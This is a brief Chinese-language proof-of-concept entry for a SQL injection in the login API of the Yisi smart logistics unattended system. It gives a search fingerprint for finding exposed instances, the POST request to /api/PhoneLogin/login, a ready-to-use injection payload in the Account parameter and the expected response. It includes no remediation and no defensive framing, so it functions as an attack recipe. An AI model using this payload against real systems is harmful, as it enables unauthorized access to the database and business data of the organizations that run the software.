# 易思智能物流无人值守系统loginSQL注入漏洞

易思智能物流无人值守系统login ｜ SQL注入 ｜ —
- **指纹**：`body="/api/SingleLogin"`
- **请求**：`POST /api/PhoneLogin/login HTTP/1.1`

**Payload**
```
Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))=1--&Espassword=g5edid4OCFI32C5NPEZeXg%3D%3D
```
- **响应特征**：200